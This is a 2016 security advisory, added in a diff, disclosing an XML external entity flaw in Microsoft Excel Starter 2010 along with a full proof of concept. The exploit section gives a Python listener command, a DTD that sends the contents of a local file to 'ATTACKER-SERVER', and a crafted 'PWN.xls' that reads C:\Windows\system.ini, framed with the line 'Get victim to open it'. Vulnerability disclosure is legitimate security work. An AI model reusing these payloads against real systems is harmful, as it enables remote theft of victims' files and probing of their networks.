@@ -1,0 +1,151 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-EXCEL-STARTER-XXE-REMOTE-FILE-DISCLOSURE.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+
+Product:
+============================
+Microsoft Excel Starter 2010
+EXCELC.EXE  / "OFFICEVIRT.EXE"
+
+This is a bundled Excel "starter" version that comes 'pre-loaded' with some
+Windows systems running, this was tested on Windows 7 etc.
+
+"C:\Program Files (x86)\Common Files\microsoft shared\Virtualization
+Handler\CVH.EXE" "Microsoft Excel Starter 2010 9014006604090000"
+C:\PROGRA~2\COMMON~1\MICROS~1\VIRTUA~1
+
+Reference:
+https://support.office.com/en-us/article/Excel-features-that-are-not-fully-supported-in-Excel-Starter-0982b3f1-7bca-49a7-a04b-3c09d05941d4
+
+Microsoft Excel Starter 2010 is a simplified version of Excel that comes
+pre-loaded on your computer.
+Excel Starter includes features that are basic to creating and working with
+spreadsheets, but it does not include the rich set of features found
+in the full version of Excel.
+
+
+
+Vulnerability Type:
+====================
+XML External Entity
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+Microsoft Excel Starter OLD versions specifically ".xls" and ".xlthtml"
+files are vulnerable to XML External Entity attack. This can allow
+remote attackers to access and disclose ANY files from a victims computer
+if they open a corrupt ".xls" Excel file. We can also abuse XXE to
+make connections to the victims system/LAN and bypass Firewall,IPS etc
+(XXE/SSRF).
+
+Note: This has NOT worked in regular or updated patched Excel editions.
+
+When open the victim will get a warn message about it being a "different
+format and from trusted source".
+If user choose open the file they get error message "File cannot be opened
+because: System does not support the specified encoding."
+Then files you target get accessed and transfered to remote server.
+
+IF Excel version is "patched" or newer you will see message like "File
+cannot be opened because: Reference to undefined entity 'send' etc..."
+and XXE will fail.
+
+Tested successfully on several machines HP, TOSHIBA Windows 7 SP1 with
+Excel Starter 2010 versions. As some machines may still be running old
+pre-loaded Excel version it can be relevant so I release it anyways...
+
+
+
+Exploit code(s):
+===============
+
+POC to exfiltrate "system.ini" used by MS ADO Remote Data Services.
+
+
+Listen port 8080 (ATTACKER-SERVER)
+python -m SimpleHTTPServer 8080
+
+
+1) "payload.dtd" ( host on attacker server port 8080 same dir as our python web server )
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-SERVER:8080?%file;'>">
+%all;
+
+
+2) "PWN.xls"  Get vicitm to open it, ANY files belong to you!
+
+<?xml version="1.0"?>
+<!DOCTYPE APPARITION [
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+
+Open the "PWN.xls" in Excel Starter 2010 then BOOM! ... its raining files!
+
+
+Video POC:
+https://vimeo.com/181891000
+
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification: September 4, 2016
+MSRC Response: "Out of date Office Client"
+December 4, 2016  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+High
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
